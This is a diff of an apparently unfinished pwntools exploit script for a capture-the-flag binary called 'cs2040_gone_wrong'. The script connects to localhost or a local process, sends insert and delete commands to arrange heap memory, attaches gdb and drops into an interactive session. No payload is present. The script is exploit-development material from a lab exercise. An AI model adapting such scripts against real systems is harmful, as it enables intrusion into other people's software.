@@ -5,7 +5,7 @@ context.terminal = ["cmd.exe", "/c", "wt.exe", "nt", "-H", "wsl.exe", "--", "sh"
 if args.REMOTE:
     p = remote('localhost', 5003)
 else:
-    p = process('./dist/cs2040_gone_wrong.o', env = {'LD_PRELOAD': './dist/libc.so.6'})
+    p = process('./dist/cs2040_gone_wrong.o', env = {'LD_PRELOAD': './dist/libc-2.27.so'})
 
 def insert(v):
     p.sendlineafter('Option: ', '1')
@@ -20,21 +20,21 @@ def view():
     p.sendlineafter('Option: ', '3')
     return p.recvline()
 
-insert(100)
+insert(0x100)
 
-insert(50)
-insert(35)
-insert(70)
+insert(0x50)
+insert(0x35)
+insert(0x70)
 
-insert(105)
+insert(0x105)
 
 
 info(view())
 
-# gdb.attach(p)
-delete(50)
-delete(105)
-success(view())
-delete(70)
+gdb.attach(p)
+delete(0x35)
+delete(0)
+insert(0x1000)
+insert(0x1000)
 
-success(view())
+p.interactive()
